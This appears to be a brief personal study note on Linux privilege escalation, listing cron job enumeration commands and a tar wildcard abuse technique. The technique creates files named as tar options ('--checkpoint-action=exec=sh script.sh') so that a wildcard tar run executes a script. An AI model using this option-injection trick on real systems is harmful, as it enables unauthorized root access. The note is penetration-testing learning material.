- [ ] WildCards
- [ ] Cron Jobs
- [ ] Tar WildCard Abuse

WildCards!!!
![[Pasted image 20251020123706.png]]
Cron Jobs!!!
```sh
cat /etc/crontab
crontab -l
```
Tar WildCard Abuse!!!
```sh
echo "" > '--checkpoint=1'  
echo "" > '--checkpoint-action=exec=sh script.sh'

https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
```